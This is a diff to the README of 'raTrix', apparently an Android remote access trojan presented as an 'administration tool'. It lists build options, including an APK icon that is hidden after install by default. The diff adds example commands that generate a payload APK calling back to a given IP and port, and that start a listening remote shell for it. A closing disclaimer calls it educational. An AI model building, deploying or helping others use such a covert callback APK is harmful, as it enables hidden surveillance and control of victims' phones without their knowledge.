@@ -1,6 +1,6 @@
 <img src="https://github.com/MrpasswordTz/raTrix/blob/main/images/2.jpg" alt= 'ratrix picture' >
 
-# raTrix
+# raTrix 🐀 
 raTrix is a powerful Android administration tool designed for Linux systems. It utilizes Python on the client-side and Java on the server-side to provide a robust and efficient management solution.
 
 # FEATURE FOR raTrix
@@ -80,5 +80,17 @@ Usage:
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
     -icon, --icon           Visible icon after installing apk (by default set to hidden)
 ```
+
+# Examples 
+<b>in buliding mode(generating apk)</b>
+```
+python3 raTrix.py -i 192.169.120.34 -p 8080
+```
+
+<b>in shell mode (listening)</b>
+```
+python3 raTrix.py --shell -i 192.169.120.34 -p 8080
+```
+
 # Disclaimer
 This tool is only for educational purposes, i will not be responsible for any Damage
